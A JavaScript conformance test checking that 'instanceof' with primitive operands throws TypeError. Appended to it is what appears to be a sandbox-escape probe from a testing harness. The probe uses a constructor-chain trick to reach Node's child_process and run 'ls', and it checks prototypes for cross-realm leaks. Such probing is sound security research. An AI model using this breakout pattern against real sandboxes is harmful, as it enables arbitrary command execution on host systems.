try {
    try {
        true instanceof true;
        $ERROR('#1: true instanceof true throw TypeError');
    } catch (e) {
        if (e instanceof TypeError !== true) {
            $ERROR('#1: true instanceof true throw TypeError');
        }
    }
    try {
        1 instanceof 1;
        $ERROR('#2: 1 instanceof 1 throw TypeError');
    } catch (e) {
        if (e instanceof TypeError !== true) {
            $ERROR('#2: 1 instanceof 1 throw TypeError');
        }
    }
    try {
        'string' instanceof 'string';
        $ERROR('#3: "string" instanceof "string" throw TypeError');
    } catch (e) {
        if (e instanceof TypeError !== true) {
            $ERROR('#3: "string" instanceof "string" throw TypeError');
        }
    }
    try {
        undefined instanceof undefined;
        $ERROR('#4: undefined instanceof undefined throw TypeError');
    } catch (e) {
        if (e instanceof TypeError !== true) {
            $ERROR('#4: undefined instanceof undefined throw TypeError');
        }
    }
    try {
        null instanceof null;
        $ERROR('#5: null instanceof null throw TypeError');
    } catch (e) {
        if (e instanceof TypeError !== true) {
            $ERROR('#5: null instanceof null throw TypeError');
        }
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}